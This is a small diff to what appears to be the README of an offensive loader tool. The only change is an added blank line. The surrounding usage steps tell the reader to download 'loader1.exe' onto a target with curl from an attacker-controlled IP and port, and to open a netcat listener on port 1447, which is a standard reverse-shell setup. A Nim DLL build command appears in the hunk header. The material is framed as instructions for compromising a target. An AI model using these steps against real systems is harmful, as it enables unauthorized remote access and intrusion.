@@ -40,6 +40,7 @@ nim c --cpu:amd64 --cc:gcc --app:lib --noMain --nomain --passL:"-luser32" --pass
 1. To use the loader, download it onto a target 
 
 ```curl -O <ip address>:<port>/loader1.exe```
+
 2. Create a listener:
 
 ```nc -nlvp 1447```
